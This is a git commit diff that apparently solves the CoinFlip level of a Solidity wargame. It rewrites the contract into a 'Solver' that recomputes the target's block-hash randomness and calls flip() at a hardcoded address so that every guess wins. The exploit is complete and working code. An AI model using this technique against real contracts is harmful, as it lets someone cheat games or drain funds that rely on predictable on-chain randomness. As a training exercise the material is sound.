05f680352ed36a00e4cce37d83b57fbe981ecc39
vcth4nh <tvu25337@gmail.coam>
2023-02-01 02:39:01 +0700

    done CoinFlip

--- contracts/CoinFlip.sol
+++ contracts/CoinFlip.sol
@@ -1,19 +1,13 @@
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.8.0;
 
-contract CoinFlip {
+contract Solver {
 	uint256 public consecutiveWins;
 	uint256 lastHash;
 	uint256 FACTOR =
 		57896044618658097711785492504343953926634992332820282019728792003956564819968;
-	CoinFlip cf;
-
-	constructor(address _target) {
-		consecutiveWins = 0;
-		cf = CoinFlip(_target);
-	}
-
-	function flip(bool _guess) public returns (bool) {
+	CoinFlip cf = CoinFlip(0xf7AE8E42dC8e9b533D6c6d711a8930c7bc58150D);
+	function solve() public{
 		uint256 blockValue = uint256(blockhash(block.number - 1));
 
 		if (lastHash == blockValue) {
@@ -26,13 +20,10 @@ contract CoinFlip {
 		bool side = coinFlip == 1 ? true : false;
 
 		require(cf.flip(side), "error");
-
-		if (side == _guess) {
-			consecutiveWins++;
-			return true;
-		} else {
-			consecutiveWins = 0;
-			return false;
-		}
+		consecutiveWins++;
 	}
+}
+
+contract CoinFlip {
+	function flip(bool _guess) public returns (bool) {}
 }
